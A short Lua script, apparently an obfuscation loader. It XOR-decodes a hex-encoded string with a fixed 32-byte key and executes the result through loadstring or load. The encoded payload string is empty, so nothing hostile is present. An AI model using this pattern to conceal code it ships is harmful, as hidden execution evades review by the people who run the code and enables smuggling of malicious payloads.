local k={106,87,81,98,169,207,52,177,30,74,22,100,38,60,31,117,245,141,222,133,161,255,203,10,167,6,92,19,12,24,94,219}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
